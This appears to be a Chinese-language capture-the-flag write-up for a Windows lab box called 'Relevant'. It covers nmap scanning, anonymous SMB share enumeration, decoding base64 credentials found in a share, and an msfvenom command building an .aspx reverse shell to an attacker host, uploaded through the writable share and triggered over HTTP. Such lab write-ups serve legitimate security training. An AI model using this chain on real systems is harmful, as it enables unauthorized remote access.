# Relevant

nmap快速扫描：
```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
```

nmap版本扫描:
```
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds
Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-09T02:29:08-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h20m00s, deviation: 4h02m31s, median: 0s
| smb2-time: 
|   date: 2024-06-09T09:29:10
|_  start_date: 2024-06-09T09:25:23
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

以后unknown的端口都要好好扫扫，控了我两天。
PORT      STATE    SERVICE VERSION
49663/tcp open     http    Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
49666/tcp open     msrpc   Microsoft Windows RPC
49668/tcp filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

其中有smb有关的端口，可以使用smbclient枚举:  
```smbclient -N -L //IP/```  
```
输出：
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv       Disk      
```
尝试登录一下nt4wrksv：  
```smbclient //IP/nt4wrksv```
里面有一个名为passwords.txt的文件，使用get下载，查看内容：  
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk%  
```

第一个看上去像是base64：  
```echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d```
不知道为什么，使用终端解出来的会多一个%:  
```Bob - !P@$$W0rD!123```  
第二个好像也是base64(反正解出来了)：  
```Bill - Juw4nnaM4n420696969!$$$```
好了，实锤了，上面的password是兔子洞。

可以直接传反shell进去，使用msfvenom生成：
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx -o  reverse-shell.aspx
```
登陆进入smb使用put把反shell放进smb共享目录里，然后访问http://IP/nt4wrksv/reshell执行。




###